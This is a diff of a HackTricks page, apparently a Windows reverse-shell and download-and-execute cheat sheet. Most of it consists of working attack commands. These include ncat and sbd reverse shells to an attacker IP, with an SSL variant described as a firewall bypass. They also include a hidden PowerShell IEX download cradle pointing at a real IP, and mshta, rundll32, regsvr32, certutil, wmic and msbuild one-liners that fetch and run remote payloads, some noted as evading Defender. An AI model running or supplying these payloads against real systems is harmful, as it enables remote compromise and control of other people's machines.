@@ -1,33 +1,27 @@
 # Shells - Windows
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary>Support HackTricks</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+**Try Hard Security Group**
 
-**HackenProof is home to all crypto bug bounties.**
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
-**Get rewarded without delays**\
-HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
-**Get experience in web3 pentesting**\
-Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
-
-**Become the web3 hacker legend**\
-Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
-
-[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
-
-{% embed url="https://hackenproof.com/register" %}
+***
 
 ## Lolbas
 
@@ -39,10 +33,36 @@ Obviously, **there aren't SUID files or sudo privileges in Windows**, but it's u
 ```bash
 nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
+## NCAT
+victim
+```
+ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
+#Encryption to bypass firewall
+ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
+```
+attacker
+```
+ncat -l <PORT>
+#Encryption to bypass firewall
+ncat -l <PORT eg.443> --ssl
+```
 
 ## SBD
 
-**sbd** is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe (part of the Kali linux distribution: /usr/share/windows-resources/sbd/sbd.exe) can be uploaded to a Windows box as a Netcat alternative.
+**[sbd](https://www.kali.org/tools/sbd/) is a portable and secure Netcat alternative**. It works on Unix-like systems and Win32. With features like strong encryption, program execution, customizable source ports, and continuous reconnection, sbd provides a versatile solution for TCP/IP communication. For Windows users, the sbd.exe version from the Kali Linux distribution can be used as a reliable replacement for Netcat.
+
+```bash
+# Victims machine
+sbd -l -p 4444 -e bash -v -n
+listening on port 4444
+
+
+# Atackers
+sbd 10.10.10.10 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 
 ## Python
 
@@ -120,30 +140,23 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 
 ## Mshta
 
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
-
-Process performing network call: **mshta.exe**\
-Payload written on disk: **IE local cache**
 
 ```bash
 mshta http://webserver/payload.hta
 ```
 
-Process performing network call: **mshta.exe**\
-Payload written on disk: **IE local cache**
-
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
 
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
-
 #### **Example of hta-psh reverse shell (use hta to download and execute PS backdoor)**
 
-```markup
+```xml
  <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
 
@@ -151,7 +164,9 @@ Payload written on disk: **WebDAV client local cache**
 
 #### hta example
 
-```markup
+[**From here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+
+```xml
 <html>
 <head>
 <HTA:APPLICATION ID="HelloExample">
@@ -166,11 +181,13 @@ Payload written on disk: **WebDAV client local cache**
 </html>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+
 
 #### **mshta - sct**
 
-```markup
+[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+
+```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
@@ -186,7 +203,6 @@ Payload written on disk: **WebDAV client local cache**
 </scriptlet>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
 #### **Mshta - Metasploit**
 
@@ -203,29 +219,30 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 **Detected by defender**
 
+
+
+
 ## **Rundll32**
 
 [**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
+
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
 
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
-
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-
-Process performing network call: **rundll32.exe**\
-Payload written on disk: **IE local cache**
 
 **Detected by defender**
 
 **Rundll32 - sct**
 
-```bash
+[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+
+```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
@@ -239,8 +256,6 @@ Payload written on disk: **IE local cache**
 </script>
 </scriptlet>
 ```
-
-**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
 #### **Rundll32 - Metasploit**
 
@@ -263,23 +278,22 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 
 ## Regsvr32
 
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
-
-Process performing network call: **regsvr32.exe**\
-Payload written on disk: **IE local cache**
 
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
-
 **Detected by defender**
 
 #### Regsvr32 -sct
+
+[**From here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 
 ```markup
 <?XML version="1.0"?>
@@ -298,7 +312,7 @@ Payload written on disk: **WebDAV client local cache**
 </scriptlet>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+
 
 #### **Regsvr32 - Metasploit**
 
@@ -315,6 +329,8 @@ run
 
 ## Certutil
 
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
 Download a B64dll, decode it and execute it.
 
 ```bash
@@ -329,22 +345,6 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 **Detected by defender**
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
-
-**HackenProof is home to all crypto bug bounties.**
-
-**Get rewarded without delays**\
-HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
-
-**Get experience in web3 pentesting**\
-Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
-
-**Become the web3 hacker legend**\
-Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
-
-[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
-
-{% embed url="https://hackenproof.com/register" %}
 
 ## **Cscript/Wscript**
 
@@ -399,16 +399,16 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-```
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+
+```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
 
-Process performing network call: **wmic.exe**\
-Payload written on disk: **IE local cache**
+Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 
-Example xsl file:
-
-```
+```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
 <output method="text"/>
@@ -420,20 +420,17 @@ Example xsl file:
 </stylesheet>
 ```
 
-Extracted from [here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
-
 **Not detected**
 
 **You can download & execute very easily a Koadic zombie using the stager wmic**
 
 ## Msbuild
 
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
 
 You can use this technique to bypass Application Whitelisting and Powershell.exe restrictions. As you will be prompted with a PS shell.\
 Just download this and execute it: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
@@ -458,12 +455,11 @@ You can download a basic C# reverse shell from here: [https://gist.github.com/Ba
 
 ## **Regasm/Regsvc**
 
-```
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
 
@@ -471,12 +467,11 @@ Payload written on disk: **WebDAV client local cache**
 
 ## Odbcconf
 
-```
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
 
@@ -579,7 +574,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive PS modules and proxy detection (IEX)
 
-## Bibliography
+## References
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
@@ -587,34 +582,25 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 * [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
+* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
-**HackenProof is home to all crypto bug bounties.**
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
-**Get rewarded without delays**\
-HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
-
-**Get experience in web3 pentesting**\
-Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
-
-**Become the web3 hacker legend**\
-Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
-
-[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
-
-{% embed url="https://hackenproof.com/register" %}
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary>Support HackTricks</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
